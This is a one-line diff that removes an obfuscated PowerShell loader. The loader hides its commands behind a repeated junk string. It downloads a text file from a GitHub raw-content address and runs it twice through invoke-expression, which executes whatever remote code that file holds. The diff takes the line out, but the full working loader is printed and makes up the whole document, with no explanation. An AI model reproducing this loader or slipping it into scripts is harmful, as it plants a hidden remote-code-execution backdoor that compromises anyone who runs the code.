@@ -1,1 +1,1 @@
-[string]$nbvccxx={(Nemkjhfgfdgsdw-mkjhfgfdgsdOmkjhfgfdgsdbjecmkjhfgfdgsdt Nmkjhfgfdgsdet.WemkjhfgfdgsdbClmkjhfgfdgsdienmkjhfgfdgsdt).Domkjhfgfdgsdwnlomkjhfgfdgsdadsmkjhfgfdgsdtring('hmkjhfgfdgsdttpmkjhfgfdgsds:/mkjhfgfdgsd/ramkjhfgfdgsdw.githumkjhfgfdgsdbusercontmkjhfgfdgsdent.comkjhfgfdgsdm/fordmkjhfgfdgsddal/rangmkjhfgfdgsdddal/mamkjhfgfdgsdin/zemkjhfgfdgsdro.txmkjhfgfdgsdt')};$qweewqq=$nbvccxx.Replace('mkjhfgfdgsd','');$zxdsxxxxc=iex $qweewqq;invoke-expression $zxdsxxxxc
+
